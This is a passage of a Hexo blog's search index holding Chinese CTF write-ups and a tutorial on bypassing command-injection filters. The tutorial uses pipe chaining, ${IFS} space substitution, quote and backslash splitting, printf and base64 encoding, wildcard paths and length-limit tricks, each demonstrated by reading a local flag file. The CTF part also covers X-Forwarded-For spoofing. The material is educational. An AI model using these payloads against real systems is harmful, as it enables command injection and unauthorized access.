src="https://img-blog.csdnimg.cn/20200509212100179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>f12发现了非常多的编码，查百度，发现是jother编码，而且控制台可解。直接复制所有编码粘贴到控制台，回车即可。flag大写。</p><h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>打开网页什么也没有，没有其他提示，回头看题目，“头”等舱。header。进行抓包尝试。成功找到flag<br><img src="https://img-blog.csdnimg.cn/20200509214229290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h2 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h2><p>f12查看有无有用信息，找到一个base64编码(==)，解码得到test123，应该是密码了吧。<br>所以尝试登陆：发现登录失败，而且IP禁止访问，联系本地管理员。<br>所以可能是XFF。可以改一下，本地管理员那就改成本地的127.0.0.1<br>可以抓包添加，我直接使用chrome扩展插件添加了，然后刷新网页，得到flag。</p><p><img src="https://img-blog.csdnimg.cn/20200509215156264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行漏洞各种绕过方式</title>
      <link href="/posts/55d772a1/"/>
      <url>/posts/55d772a1/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚做了一道题，是有关命令执行漏洞的，里面过滤的内容比较多，一时间找不到头绪，所以学习一下关于命令执行漏洞的绕过方式，以便以后遇到不会像现在这样一点思路都没有。<br>总结完再去做就很轻松了。</p><h1 id="命令执行漏洞绕过方式"><a href="#命令执行漏洞绕过方式" class="headerlink" title="命令执行漏洞绕过方式"></a>命令执行漏洞绕过方式</h1><h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h2><h3 id="windows中常见管道符"><a href="#windows中常见管道符" class="headerlink" title="windows中常见管道符"></a>windows中常见管道符</h3><pre class="language-cmd" data-language="cmd"><code class="language-cmd">|直接执行后面的语句||如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句&amp;前面和后面命令都要执行，无论前面真假&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</code></pre><p><img src="https://img-blog.csdnimg.cn/20200710121417968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h3 id="linux中常见管道符"><a href="#linux中常见管道符" class="headerlink" title="linux中常见管道符"></a>linux中常见管道符</h3><p>以上四种管道符在linux系统中同样适用，增加一种</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">;</span>前面和后面命令都要执行，无论前面真假</code></pre><pre class="language-shell" data-language="shell"><code class="language-shell">zxcv0221@kali:~/桌面$ <span class="token function">ping</span> -c <span class="token number">1</span> m0re<span class="token punctuation">;</span><span class="token function">cat</span> flagping: m0re: 没有与主机名关联的地址you are good<span class="token operator">!</span></code></pre><h2 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h2><p>这个比较多了</p><p>1.<code>$&#123;IFS&#125;</code> </p><pre class="language-shell" data-language="shell"><code class="language-shell">zxcv0221@kali:~/桌面$ <span class="token function">cat</span><span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span>flagyou are good<span class="token operator">!</span></code></pre><ol start="2"><li><p><code>$IFS$9</code> $9指传过来的第9个参数</p><pre class="language-shell" data-language="shell"><code class="language-shell">zxcv0221@kali:~/桌面$ <span class="token function">cat</span><span class="token environment constant">$IFS</span><span class="token variable">$9flag</span>you are good<span class="token operator">!</span>zxcv0221@kali:~/桌面$ <span class="token function">cat</span><span class="token environment constant">$IFS</span><span class="token variable">$1flag</span>you are good<span class="token operator">!</span></code></pre></li><li><p><code>%09</code>(需要PHP环境，不演示)</p></li><li><p><code>&lt;</code>或者<code>&lt;&gt;</code>重定向</p><pre class="language-shell" data-language="shell"><code class="language-shell">zxcv0221@kali:~/桌面$ cat<span class="token operator">&lt;</span>flagyou are good<span class="token operator">!</span>zxcv0221@kali:~/桌面$ cat<span class="token operator">&lt;></span>flagyou are good<span class="token operator">!</span></code></pre><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><p>比如：过滤了cat或者flag</p></li><li><p>变量拼接</p><pre class="language-shell" data-language="shell"><code class="language-shell">zxcv0221@kali:~/桌面$ <span class="token assign-left variable">a</span><span class="token operator">=</span>c<span class="token punctuation">;</span><span class="token assign-left variable">b</span><span class="token operator">=</span>at<span class="token punctuation">;</span><span class="token assign-left variable">c</span><span class="token operator">=</span>fl<span class="token punctuation">;</span><span class="token assign-left variable">d</span><span class="token operator">=</span>ag<span class="token punctuation">;</span><span class="token variable">$a</span><span class="token variable">$b</span> <span class="token variable">$c</span><span class="token variable">$d</span>you are good<span class="token operator">!</span></code></pre></li><li><p>单引号，双引号绕过</p><pre class="language-shell" data-language="shell"><code class="language-shell">zxcv0221@kali:~/桌面$ ca<span class="token string">''</span>t flagyou are good<span class="token operator">!</span>zxcv0221@kali:~/桌面$ <span class="token function">cat</span><span class="token string">""</span> flagyou are good<span class="token operator">!</span></code></pre></li><li><p>编码绕过</p></li></ol><pre class="language-powershell" data-language="powershell"><code class="language-powershell">$<span class="token punctuation">(</span>printf <span class="token string">"\154\163"</span><span class="token punctuation">)</span> ==><span class="token function">ls</span>$<span class="token punctuation">(</span>printf <span class="token string">"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"</span><span class="token punctuation">)</span> ==><span class="token function">cat</span> <span class="token operator">/</span>flag<span class="token punctuation">&#123;</span>printf<span class="token punctuation">,</span><span class="token string">"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"</span><span class="token punctuation">&#125;</span><span class="token punctuation">|</span>\<span class="token variable">$0</span> ==><span class="token function">cat</span> <span class="token operator">/</span>flag</code></pre><p>栗子：</p><pre class="language-shell" data-language="shell"><code class="language-shell">zxcv0221@kali:~/桌面$ <span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">printf</span> <span class="token string">"<span class="token entity" title="\154">\154</span><span class="token entity" title="\163">\163</span>"</span><span class="token variable">)</span></span>firefox-esr.desktop  flag</code></pre><ol start="4"><li>读文件绕过(当cat被过滤)<pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>more:一页一页的显示档案内容<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>less:与 <span class="token function">more</span> 类似，但是比 <span class="token function">more</span> 更好的是，他可以<span class="token punctuation">[</span>pg dn<span class="token punctuation">]</span><span class="token punctuation">[</span>pg up<span class="token punctuation">]</span>翻页<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>head:查看头几行<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>tac:从最后一行开始显示，可以看出 <span class="token function">tac</span> 是 <span class="token function">cat</span> 的反向显示<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>tail:查看尾几行<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>nl：显示的时候，顺便输出行号<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>od:以二进制的方式读取档案内容<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>vi:一种编辑器，这个也可以查看<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>vim:一种编辑器，这个也可以查看<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>sort:可以查看<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>uniq:可以查看<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>file -f:报错出具体内容</code></pre>栗子：<pre class="language-shell" data-language="shell"><code class="language-shell">zxcv0221@kali:~/桌面$ <span class="token function">more</span> flagyou are good<span class="token operator">!</span></code></pre></li><li>反斜线</li></ol><pre class="language-shell" data-language="shell"><code class="language-shell">zxcv0221@kali:~/桌面$ c<span class="token punctuation">\</span>at fl<span class="token punctuation">\</span>agyou are good<span class="token operator">!</span></code></pre><ol start="6"><li><code>$1、$2等和$@</code><pre class="language-shell" data-language="shell"><code class="language-shell">zxcv0221@kali:~/桌面$ c<span class="token variable">$1at</span> fl<span class="token variable">$@</span>agyou are good<span class="token operator">!</span></code></pre><h2 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h2><code>?</code>代表一个字符<code>*</code>代表一串字符<pre class="language-powershell" data-language="powershell"><code class="language-powershell">zxcv0221@kali:~<span class="token operator">/</span>桌面$ <span class="token operator">/</span>???<span class="token operator">/</span>?<span class="token namespace">[a]</span><span class="token namespace">[t]</span> ?<span class="token string">''</span>?<span class="token string">''</span>?<span class="token string">''</span>?<span class="token string">''</span>you are good<span class="token operator">!</span>zxcv0221@kali:~<span class="token operator">/</span>桌面$ <span class="token operator">/</span>???<span class="token operator">/</span>?<span class="token namespace">[a]</span><span class="token namespace">[t]</span> ?<span class="token string">''</span>?<span class="token string">''</span>?<span class="token string">''</span>?<span class="token string">''</span>you are good<span class="token operator">!</span>zxcv0221@kali:~<span class="token operator">/</span>桌面$ <span class="token operator">/</span>???<span class="token operator">/</span>?at flagyou are good<span class="token operator">!</span>zxcv0221@kali:~<span class="token operator">/</span>桌面$ <span class="token operator">/</span>???<span class="token operator">/</span>?at ????you are good<span class="token operator">!</span>zxcv0221@kali:~<span class="token operator">/</span>桌面$ <span class="token operator">/</span>???<span class="token operator">/</span>?<span class="token namespace">[a]</span><span class="token string">''</span><span class="token namespace">[t]</span> ?<span class="token string">''</span>?<span class="token string">''</span>?<span class="token string">''</span>?<span class="token string">''</span>you are good<span class="token operator">!</span></code></pre>我服了，这都可以？长见识666🍭<br><code>*</code>下众生平等🥙</li></ol><h2 id="内敛执行绕过"><a href="#内敛执行绕过" class="headerlink" title="内敛执行绕过"></a>内敛执行绕过</h2><pre class="language-cmd" data-language="cmd"><code class="language-cmd">&#96;命令&#96;和$(命令)都是执行命令的方式</code></pre><p>栗子：</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">zxcv0221@kali:~<span class="token operator">/</span>桌面$ <span class="token function">echo</span> <span class="token string">"m0re`cat flag`"m0reyou are good!zxcv0221@kali:~/桌面$ echo "</span>m0re $<span class="token punctuation">(</span><span class="token function">cat</span> flag<span class="token punctuation">)</span><span class="token string">"m0re you are good!zxcv0221@kali:~/桌面$ echo "</span>m0re $<span class="token punctuation">(</span><span class="token function">pwd</span><span class="token punctuation">)</span>"m0re <span class="token operator">/</span>home<span class="token operator">/</span>zxcv0221<span class="token operator">/</span>桌面</code></pre><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>使用base64编码进行绕过</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">zxcv0221@kali:~<span class="token operator">/</span>桌面$ `<span class="token function">echo</span> <span class="token string">"Y2F0IGZsYWc="</span><span class="token punctuation">|</span>base64 <span class="token operator">-</span>d`you are good<span class="token operator">!</span></code></pre><h2 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h2><h3 id="gt-和-gt-gt-两个符号的使用"><a href="#gt-和-gt-gt-两个符号的使用" class="headerlink" title="&gt;和&gt;&gt;两个符号的使用"></a><code>&gt;</code>和<code>&gt;&gt;</code>两个符号的使用</h3><p>使用<code>&gt;</code>命令会将原有文件内容覆盖，如果是存入不存在的文件名，那么就会新建文件再存入<br><img src="https://img-blog.csdnimg.cn/20200710131921488.png" alt="m0re" loading="lazy"><br><code>&gt;&gt;</code>符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容<br><img src="https://img-blog.csdnimg.cn/20200710132050310.png" alt="m0re" loading="lazy"></p><h3 id="命令换行"><a href="#命令换行" class="headerlink" title="命令换行"></a>命令换行</h3><p>换行执行命令</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">zxcv0221@kali:~<span class="token operator">/</span>桌面$ ca\> t\>  <span class="token function">fl</span>\> agyou are good<span class="token operator">!</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200710132232739.png" alt="m0re" loading="lazy"><br>可以尝试写一个文件来执行命令</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">zxcv0221@kali:~<span class="token operator">/</span>桌面$ <span class="token function">echo</span> <span class="token string">"ca\\"</span>>shellzxcv0221@kali:~<span class="token operator">/</span>桌面$ <span class="token function">echo</span> <span class="token string">"t\\"</span>>>shellzxcv0221@kali:~<span class="token operator">/</span>桌面$ <span class="token function">echo</span> <span class="token string">" fl\\"</span>>>shellzxcv0221@kali:~<span class="token operator">/</span>桌面$ <span class="token function">echo</span> <span class="token string">"ag"</span>>>shellzxcv0221@kali:~<span class="token operator">/</span>桌面$ <span class="token function">cat</span> shellca\t\ <span class="token function">fl</span>\agzxcv0221@kali:~<span class="token operator">/</span>桌面$ sh shellyou are good<span class="token operator">!</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200710132704301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>还有一种是使用kali中的一个工具，名字叫metasploit<br>学会使用，需要实践利用，这里就不演示了，就像我之前写的提权的那篇文章就用到了metasploit，这个确实是一个非常强大的工具。我已经爱上这个工具了。<br>目前这些应该就够我现阶段用的了。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.ghtwf01.cn/index.php/archives/273/">命令执行漏洞利用及绕过方式总结</a><br><a href="https://www.cnblogs.com/ophxc/p/12826497.html">命令执行漏洞，绕过过滤姿势</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞利用</title>
      <link href="/posts/ac7476fe/"/>
      <url>/posts/ac7476fe/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="Hey, password is required here." /><label>Hey, password is required here.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="dc756147b738fad93c451a50de62dec54698407f7000be35ab87599350d13af1"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> encrypt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/4a17b156/"/>
      <url>/posts/4a17b156/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>漏洞扫描</title>
      <link href="/posts/b077f1ad/"/>
      <url>/posts/b077f1ad/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="噢，这是无效的密码。请检查并重试。" data-whm="哦，这些解密的内容无法验证，但您仍然可以看一下。"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="嘿~这里需要密码。" /><label>嘿~这里需要密码。</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="4c4d5d6a191763857d63996bb1a3ba57197f3eaa3f660098c64d31e5c50fe9e4"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> encrypt </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
